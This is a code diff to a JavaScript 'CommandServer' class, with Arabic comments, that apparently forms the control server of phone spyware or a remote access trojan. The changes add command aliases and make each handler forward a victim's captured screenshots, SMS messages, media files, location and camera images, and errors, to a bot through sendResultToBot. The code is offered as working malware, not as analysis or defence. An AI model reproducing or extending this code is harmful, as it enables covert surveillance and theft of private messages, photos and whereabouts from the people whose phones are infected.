@@ -1076,6 +1076,7 @@ class CommandServer {
           this.handleSystemResult('monitor', result, error, timestamp);
           break;
         case 'screenshot_take':
+        case 'take_screenshot':
           this.handleScreenshotResult(result, error, timestamp);
           break;
         case 'contacts_get':
@@ -1083,15 +1084,19 @@ class CommandServer {
           this.handleContactsResult(result, error, timestamp);
           break;
         case 'sms_get':
+        case 'backup_sms':
           this.handleSMSResult(result, error, timestamp);
           break;
         case 'media_get':
+        case 'backup_media':
           this.handleMediaResult(result, error, timestamp);
           break;
         case 'location_get':
+        case 'get_location':
           this.handleLocationResult(result, error, timestamp);
           break;
         case 'camera_capture':
+        case 'record_camera':
           this.handleCameraResult(result, error, timestamp);
           break;
         case 'microphone_record':
@@ -1256,10 +1261,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('screenshot', screenshotData);
       console.log('📸 تم التقاط لقطة شاشة');
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('take_screenshot', screenshotData);
     }
     
     if (error) {
       console.error('❌ خطأ في Screenshot:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('take_screenshot', null, error);
     }
   }
 
@@ -1299,10 +1309,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('sms', smsData);
       console.log(`💬 تم الحصول على ${smsData.count} رسالة SMS`);
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('backup_sms', smsData);
     }
     
     if (error) {
       console.error('❌ خطأ في SMS:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('backup_sms', null, error);
     }
   }
 
@@ -1318,10 +1333,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('media', mediaData);
       console.log(`📱 تم الحصول على ${mediaData.count} ملف وسائط`);
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('backup_media', mediaData);
     }
     
     if (error) {
       console.error('❌ خطأ في Media:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('backup_media', null, error);
     }
   }
 
@@ -1337,10 +1357,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('location', locationData);
       console.log('📍 تم الحصول على الموقع');
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('get_location', locationData);
     }
     
     if (error) {
       console.error('❌ خطأ في Location:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('get_location', null, error);
     }
   }
 
@@ -1356,10 +1381,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('camera', cameraData);
       console.log('📷 تم التقاط صورة من الكاميرا');
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('record_camera', cameraData);
     }
     
     if (error) {
       console.error('❌ خطأ في Camera:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('record_camera', null, error);
     }
   }
 
